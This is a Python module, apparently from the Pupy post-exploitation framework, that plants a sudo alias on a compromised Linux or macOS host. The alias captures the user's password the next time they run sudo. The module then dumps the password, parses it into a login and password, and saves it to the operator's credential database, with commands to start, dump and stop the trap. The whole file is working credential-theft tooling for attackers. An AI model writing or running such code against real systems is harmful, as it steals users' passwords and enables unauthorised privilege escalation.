# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.credentials import Credentials

__class_name__="SudoAlias"

@config(compat=['linux', 'darwin'], cat="admin")
class SudoAlias(PupyModule):
    """ write an alias for sudo to retrieve user password """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="sudo_alias", description=self.__doc__)
        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        self.client.load_package("sudo_alias")
        if args.action=="start":
            if not self.client.conn.modules["sudo_alias"].sudo_alias_start():
                self.error("the alias already exists")
            else:
                self.success("the alias has been created. Waiting for a user to run a sudo command...")
        elif args.action=="dump":
            data = self.client.conn.modules["sudo_alias"].sudo_alias_dump()
            if not data:
                self.error("nothing find, be patient !")
            else:
                self.success("Sudo password found: %s" % data)
                
                # add password to the database
                username = data.split('/')[0]
                password = data.replace(username, '')[1:]
                db = Credentials()
                db.add([{'Login': username, 'password':password, 'CredType': 'plaintext', 'Category': 'System password', 'uid': self.client.short_name()}])
                self.success("Credentials stored on the database")
                
        elif args.action=="stop":
            if not self.client.conn.modules["sudo_alias"].sudo_alias_stop():
                self.error('the alias has not been created yet (run start)')
            else:
                self.success('everyhing has been stopped and cleaned')